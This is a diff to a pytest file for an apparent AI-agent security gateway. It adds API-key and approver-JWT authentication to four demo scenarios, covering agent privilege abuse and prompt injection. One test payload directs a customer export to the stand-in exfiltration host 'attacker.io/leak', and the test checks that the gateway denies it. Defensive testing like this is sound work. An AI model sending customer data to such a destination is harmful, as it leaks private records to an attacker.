@@ -27,10 +27,13 @@ from app.models.enums import (
     ExecutionStatus,
     PolicyDecision,
     RiskLevel,
+    UserRole,
 )
 from app.models.execution import Execution
 from app.models.tool import Tool, ToolAction
+from app.models.user import User
 from app.services.pdp_engine import PDPDecisionResult
+from tests.conftest import make_admin_jwt, make_api_key_pair
 
 
 @pytest.mark.asyncio
@@ -54,6 +57,7 @@ async def test_demo_scenario_1_normal_operation_allow():
     mock_db = AsyncMock()
     mock_db.add = MagicMock()
 
+    raw_key, _, res_key = make_api_key_pair(org_id)
     res_agent = MagicMock()
     res_agent.scalar_one_or_none.return_value = agent
     res_tool = MagicMock()
@@ -63,7 +67,7 @@ async def test_demo_scenario_1_normal_operation_allow():
     res_agent_tool = MagicMock()
     res_agent_tool.scalar_one_or_none.return_value = agent_tool
 
-    mock_db.execute.side_effect = [res_agent, res_tool, res_action, res_agent_tool]
+    mock_db.execute.side_effect = [res_key, res_agent, res_tool, res_action, res_agent_tool]
 
     app.dependency_overrides[get_db] = lambda: mock_db
 
@@ -84,7 +88,11 @@ async def test_demo_scenario_1_normal_operation_allow():
                     "action_name": "create_quote",
                     "parameters": {"amount": 2500, "customer": "Acme Corp"},
                 }
-                res = await client.post("/api/v1/gateway/execute", json=payload)
+                res = await client.post(
+                    "/api/v1/gateway/execute",
+                    headers={"X-AgentGuard-Key": raw_key},
+                    json=payload,
+                )
 
                 assert res.status_code == 200
                 data = res.json()
@@ -119,6 +127,7 @@ async def test_demo_scenario_2_privilege_abuse_deny():
     mock_db = AsyncMock()
     mock_db.add = MagicMock()
 
+    raw_key, _, res_key = make_api_key_pair(org_id)
     res_agent = MagicMock()
     res_agent.scalar_one_or_none.return_value = agent
     res_tool = MagicMock()
@@ -128,7 +137,7 @@ async def test_demo_scenario_2_privilege_abuse_deny():
     res_agent_tool = MagicMock()
     res_agent_tool.scalar_one_or_none.return_value = None  # Capacidad no asignada
 
-    mock_db.execute.side_effect = [res_agent, res_tool, res_action, res_agent_tool]
+    mock_db.execute.side_effect = [res_key, res_agent, res_tool, res_action, res_agent_tool]
 
     app.dependency_overrides[get_db] = lambda: mock_db
 
@@ -142,7 +151,11 @@ async def test_demo_scenario_2_privilege_abuse_deny():
                 "action_name": "update_price",
                 "parameters": {"product_id": 88, "new_price": 10},
             }
-            res = await client.post("/api/v1/gateway/execute", json=payload)
+            res = await client.post(
+                "/api/v1/gateway/execute",
+                headers={"X-AgentGuard-Key": raw_key},
+                json=payload,
+            )
 
             assert res.status_code == 403
             data = res.json()
@@ -179,6 +192,17 @@ async def test_demo_scenario_3_high_impact_require_approval_and_resolve():
     mock_db = AsyncMock()
     mock_db.add = MagicMock()
 
+    approver_id = uuid.uuid4()
+    approver_user = User(
+        id=approver_id,
+        organization_id=org_id,
+        email="approver@acme.com",
+        role=UserRole.APPROVER,
+    )
+    res_user = MagicMock()
+    res_user.scalar_one_or_none.return_value = approver_user
+
+    raw_key, _, res_key = make_api_key_pair(org_id)
     res_agent = MagicMock()
     res_agent.scalar_one_or_none.return_value = agent
     res_tool = MagicMock()
@@ -188,7 +212,7 @@ async def test_demo_scenario_3_high_impact_require_approval_and_resolve():
     res_agent_tool = MagicMock()
     res_agent_tool.scalar_one_or_none.return_value = agent_tool
 
-    mock_db.execute.side_effect = [res_agent, res_tool, res_action, res_agent_tool]
+    mock_db.execute.side_effect = [res_key, res_agent, res_tool, res_action, res_agent_tool, res_user]
 
     app.dependency_overrides[get_db] = lambda: mock_db
 
@@ -210,7 +234,11 @@ async def test_demo_scenario_3_high_impact_require_approval_and_resolve():
                     "action_name": "refund",
                     "parameters": {"amount": 4500, "customer_id": 302},
                 }
-                res = await client.post("/api/v1/gateway/execute", json=payload)
+                res = await client.post(
+                    "/api/v1/gateway/execute",
+                    headers={"X-AgentGuard-Key": raw_key},
+                    json=payload,
+                )
 
                 assert res.status_code == 202
                 data = res.json()
@@ -220,7 +248,6 @@ async def test_demo_scenario_3_high_impact_require_approval_and_resolve():
                 assert approval_id is not None
 
         # Paso 3.2: Resolución humana
-        approver_id = uuid.uuid4()
         now = datetime.now(timezone.utc)
         resolved_approval = Approval(
             id=uuid.UUID(approval_id),
@@ -241,7 +268,11 @@ async def test_demo_scenario_3_high_impact_require_approval_and_resolve():
                     "resolution_reason": "Cliente VIP validado",
                     "approver_user_id": str(approver_id),
                 }
-                res_resolve = await client.post(f"/api/v1/approvals/{approval_id}/resolve", json=resolve_payload)
+                res_resolve = await client.post(
+                    f"/api/v1/approvals/{approval_id}/resolve",
+                    headers=make_admin_jwt(approver_user),
+                    json=resolve_payload,
+                )
 
                 assert res_resolve.status_code == 200
                 res_data = res_resolve.json()
@@ -280,6 +311,7 @@ async def test_demo_scenario_4_prompt_injection_deny_and_critical_alert():
 
     mock_db.add = MagicMock(side_effect=capture_add)
 
+    raw_key, _, res_key = make_api_key_pair(org_id)
     res_agent = MagicMock()
     res_agent.scalar_one_or_none.return_value = agent
     res_tool = MagicMock()
@@ -289,7 +321,7 @@ async def test_demo_scenario_4_prompt_injection_deny_and_critical_alert():
     res_agent_tool = MagicMock()
     res_agent_tool.scalar_one_or_none.return_value = agent_tool
 
-    mock_db.execute.side_effect = [res_agent, res_tool, res_action, res_agent_tool]
+    mock_db.execute.side_effect = [res_key, res_agent, res_tool, res_action, res_agent_tool]
 
     app.dependency_overrides[get_db] = lambda: mock_db
 
@@ -310,7 +342,11 @@ async def test_demo_scenario_4_prompt_injection_deny_and_critical_alert():
                     "action_name": "export_customers",
                     "parameters": {"destination": "https://attacker.io/leak"},
                 }
-                res = await client.post("/api/v1/gateway/execute", json=payload)
+                res = await client.post(
+                    "/api/v1/gateway/execute",
+                    headers={"X-AgentGuard-Key": raw_key},
+                    json=payload,
+                )
 
                 assert res.status_code == 403
                 data = res.json()
